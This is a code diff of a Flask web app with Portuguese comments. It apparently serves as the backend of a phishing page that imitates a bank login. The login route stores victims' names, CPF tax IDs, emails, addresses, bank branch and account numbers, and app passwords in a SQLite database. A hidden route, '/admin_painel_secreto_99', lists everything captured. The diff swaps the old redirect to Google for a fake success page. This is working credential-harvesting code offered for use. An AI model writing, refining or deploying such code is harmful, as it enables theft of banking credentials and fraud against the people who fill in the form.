@@ -2,18 +2,12 @@ import os
 import sqlite3
 from flask import Flask, render_template, request, redirect
 
-app = Flask(__name__, template_folder='templates')
-
-def get_db_connection():
-    # Conecta ao arquivo de banco de dados mostrado no seu GitHub
-    conn = sqlite3.connect('dados_bancarios.db')
-    conn.row_factory = sqlite3.Row
-    return conn
+app = Flask(__name__)
 
 def init_db():
-    """Garante que a tabela exista com todas as colunas"""
-    conn = get_db_connection()
+    conn = sqlite3.connect('dados_bancarios.db')
     cursor = conn.cursor()
+    # Cria a tabela com todas as colunas necessárias para os 5 passos
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS usuarios (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -31,29 +25,37 @@ def index():
 
 @app.route('/login', methods=['POST'])
 def login():
-    # Captura os dados que você está preenchendo no formulário
-    dados = (
-        request.form.get('nome'), request.form.get('cpf'), request.form.get('email'),
-        request.form.get('cep'), request.form.get('rua'),
-        request.form.get('agencia'), request.form.get('conta'), request.form.get('senha_app')
-    )
-    
-    conn = get_db_connection()
+    nome = request.form.get('nome')
+    cpf = request.form.get('cpf')
+    email = request.form.get('email')
+    cep = request.form.get('cep')
+    rua = request.form.get('rua')
+    agencia = request.form.get('agencia')
+    conta = request.form.get('conta')
+    senha_app = request.form.get('senha_app')
+
+    conn = sqlite3.connect('dados_bancarios.db')
     cursor = conn.cursor()
     cursor.execute('''
         INSERT INTO usuarios (nome, cpf, email, cep, rua, agencia, conta, senha_app)
         VALUES (?, ?, ?, ?, ?, ?, ?, ?)
-    ''', dados)
+    ''', (nome, cpf, email, cep, rua, agencia, conta, senha_app))
     conn.commit()
     conn.close()
-    return redirect("https://www.google.com")
+    
+    # Redireciona para a nova página de sucesso
+    return redirect('/sucesso')
+
+@app.route('/sucesso')
+def sucesso():
+    return render_template('sucesso.html')
 
 @app.route('/admin_painel_secreto_99')
 def admin():
-    # Tenta inicializar o banco antes de ler para evitar o erro "no such table"
-    init_db()
-    conn = get_db_connection()
-    usuarios = conn.execute('SELECT * FROM usuarios ORDER BY id DESC').fetchall()
+    conn = sqlite3.connect('dados_bancarios.db')
+    cursor = conn.cursor()
+    cursor.execute('SELECT * FROM usuarios ORDER BY id DESC')
+    usuarios = cursor.fetchall()
     conn.close()
     return render_template('admin.html', usuarios=usuarios)
 
